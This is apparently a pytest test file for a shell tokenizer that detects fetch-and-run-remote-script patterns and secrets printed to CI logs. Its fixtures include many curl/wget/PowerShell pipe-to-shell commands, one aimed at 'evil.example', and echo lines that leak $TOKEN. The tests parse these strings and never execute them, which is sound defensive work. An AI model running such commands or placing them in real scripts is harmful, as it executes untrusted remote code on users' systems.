"""The bounded shell tokenizer behind the workflow and Dockerfile rules (nothing is executed)."""

from __future__ import annotations

import pytest

from polaris.review.analyzers import shellwords
from polaris.review.analyzers.shellwords import (
    ShellLimit,
    argv,
    pipelines,
    printed,
    quote_context,
    remote_scripts,
    tokenize,
)


def names(script: str) -> list[list[str]]:
    return [[word.text for word in argv(command)] for command in tokenize(script)]


def test_commands_operators_quotes_and_continuations():
    script = "a && b || c; d | e |& f\nsudo -E env X=1 bash -s -- -y\\\n  --more\necho 'x | y' \"$(date)\" # c | d\n"
    assert names(script) == [["a"], ["b"], ["c"], ["d"], ["e"], ["f"], ["bash", "-s", "--", "-y", "--more"],
                             ["echo", "x | y", "$(date)"]]
    assert [len(item) for item in pipelines(tokenize(script))] == [1, 1, 1, 3, 1, 1]
    words = tokenize('echo "$(curl -fsSL https://x.example/i.sh)"')[0].words
    assert words[1].subs == ("curl -fsSL https://x.example/i.sh",)


def test_heredoc_bodies_are_not_commands_and_group_redirects_apply_to_members():
    script = "cat <<'EOF' > notes\ncurl https://evil.example | sh\nEOF\n{ echo a; echo b; } >> \"$GITHUB_ENV\"\n"
    commands = tokenize(script)
    assert [[word.text for word in command.words] for command in commands] == [
        ["cat"], ["{", "echo", "a"], ["echo", "b"], ["}"]]
    assert all(any(item.target == "$GITHUB_ENV" for item in command.redirects) for command in commands[1:])
    subshell = tokenize("( echo x; echo y ) > out.txt\n")
    assert all(command.redirects and command.redirects[-1].target == "out.txt" for command in subshell)


@pytest.mark.parametrize(("script", "interpreter", "url"), [
    ("curl -fsSL https://get.example.dev | sh", "sh", "https://get.example.dev"),
    ("curl https://x.example/i.sh | sudo -E bash -", "bash", "https://x.example/i.sh"),
    ("wget -qO- http://x.example/i.sh | sh -s -- --flag", "sh", "http://x.example/i.sh"),
    ("wget -O - https://x.example/i.sh | tee install.log | bash", "bash", "https://x.example/i.sh"),
    ('sh -c "$(curl -fsSL https://x.example/i.sh)"', "sh", "https://x.example/i.sh"),
    ("bash <(curl -s https://x.example/i.sh)", "bash", "https://x.example/i.sh"),
    ('eval "$(wget -qO- https://x.example/env.sh)"', "eval", "https://x.example/env.sh"),
    ("source <(curl -s https://x.example/env.sh)", "source", "https://x.example/env.sh"),
    ("curl -s https://x.example/run.py | python3 -", "python3", "https://x.example/run.py"),
    ("if curl -fsSL https://x.example/i.sh | bash; then echo ok; fi", "bash", "https://x.example/i.sh"),
    ("iwr https://x.example/i.ps1 -UseBasicParsing | iex", "powershell", "https://x.example/i.ps1"),
    ("iex ((New-Object System.Net.WebClient).DownloadString('https://x.example/i.ps1'))", "powershell",
     "https://x.example/i.ps1"),
])
def test_remote_scripts_are_found(script, interpreter, url):
    (found,) = remote_scripts(script)
    assert (found.interpreter, found.url) == (interpreter, url)


@pytest.mark.parametrize("script", [
    "curl -fsSLo install.sh https://x.example/i.sh && sh install.sh",
    "curl -O https://x.example/i.sh",
    "wget https://x.example/i.sh | sh",  # wget saves to a file unless -O - is given
    "curl -s https://x.example/api | jq -r .tag",
    "curl -s https://x.example/a.tgz | tar -xz",
    "curl -s https://x.example/a.json | python3 -c 'import json, sys; json.load(sys.stdin)'",
    "curl -s https://x.example/a.json | node -e 'process.stdin.pipe(process.stdout)'",
    "curl -s https://x.example/a | bash script.sh",
    "curl -fsSL https://x.example/i.sh || sh fallback.sh",
    'echo "curl https://x.example | sh"',
    "# curl https://x.example | sh",
    "echo hello | sh",
])
def test_lookalikes_are_not_remote_scripts(script):
    assert remote_scripts(script) == []


def test_printed_secrets_follow_output_to_the_log():
    secret = lambda word: "TOKEN" in word.raw  # noqa: E731
    script = "\n".join([
        'echo "$TOKEN"',                                      # printed (masked)
        'echo "$TOKEN" | base64',                             # printed, transformed
        'echo "$TOKEN" | docker login -u x --password-stdin',  # consumed
        'echo "$TOKEN" > token.txt',                          # file
        'echo "token=$TOKEN" >> "$GITHUB_OUTPUT"',            # file
        'echo "::add-mask::$TOKEN"',                          # masking marker
        'value=$(echo "$TOKEN" | base64)',                    # captured
        'echo "$TOKEN" >&2',                                  # stderr is the log too
        'printf "%s" "$TOKEN" | rev | cat',                   # transformed, then printed
    ])
    found = [(script.count("\n", 0, item.start), item.transformer) for item in printed(script, secret)]
    assert found == [(0, None), (1, "base64"), (7, None), (8, "rev")]


def test_heredoc_bodies_know_their_quoting_and_reader():
    script = ("cat > ctx.json <<'END'\n{ \"a\": 1 }\nEND\ncat <<EOF | sh\necho x\nEOF\n"
              "bash <<\"EOS\"\necho y\nEOS\ngh issue comment 1 --body-file - <<EOF\nhi\nEOF\n")
    data = [shellwords.heredoc_data(script, script.index(text)) for text in ('{ "a"', "echo x", "echo y", "hi")]
    assert [(item.delimiter, item.quoted) if item else None for item in data] == [
        ("END", True), None, None, ("EOF", False)]


def test_quote_context_for_exact_replacements():
    script = "echo \"a ${X}\" '${Y}' ${Z} $(echo ${W})\ncat <<EOF\n${V}\nEOF\n# ${U}\n"
    assert [quote_context(script, script.index(name)) for name in ("${X}", "${Y}", "${Z}", "${W}", "${V}", "${U}")] \
        == ["double", "single", "unquoted", "other", "other", "other"]


def test_budgets_fail_with_fixed_reasons():
    with pytest.raises(ShellLimit, match="script_too_large"):
        tokenize("x" * (shellwords.MAX_SCRIPT_CHARS + 1))
    with pytest.raises(ShellLimit, match="command_limit"):
        tokenize("a;" * (shellwords.MAX_COMMANDS + 1))
    nested = "x"
    for _ in range(20):
        nested = f'"$(echo {nested})"'
    with pytest.raises(ShellLimit, match="nesting_limit"):
        tokenize("echo " + nested)
    # Unquoted nesting is a flat scan (no recursion), and nested scanning stops at a fixed depth.
    assert remote_scripts("echo " + "$(" * 2_000 + ")" * 2_000) == []
    assert not shellwords.is_remote("http://localhost:8080/x.sh") and shellwords.is_remote("http://x.example/a")
